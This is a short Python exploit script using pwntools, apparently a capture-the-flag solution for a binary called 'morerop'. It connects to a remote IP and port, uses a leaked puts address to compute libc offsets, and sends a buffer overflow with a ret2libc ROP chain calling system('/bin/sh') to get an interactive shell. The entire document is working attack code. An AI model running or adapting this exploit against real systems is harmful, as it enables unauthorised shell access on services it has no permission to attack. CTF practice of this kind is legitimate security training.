from pwn import *

#p=process("./morerop")
p=remote("3.101.12.127",5005)

system_offset = b'0x00000000000522c0'  #readelf -s "file" | grep system
bin_sh_offset = b'0x1b45bd'  #strings -a -t x "file" | grep bin/sh
puts_offset = b'0x0000000000084450'
pop_rdi_ret = 0x0000000000401303
ret = 0x000000000040101a

p.recvline()
p.recvline()
puts_addr = int(p.recvline(),16)
base_addr = puts_addr - int(puts_offset,16)
system = base_addr + int(system_offset,16)
print(system)
bin_sh = base_addr + int(bin_sh_offset, 16)
print(int(bin_sh_offset, 16))
payload = b'a'*88 + p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(system)
p.recvline()
p.sendline(payload)
p.interactive()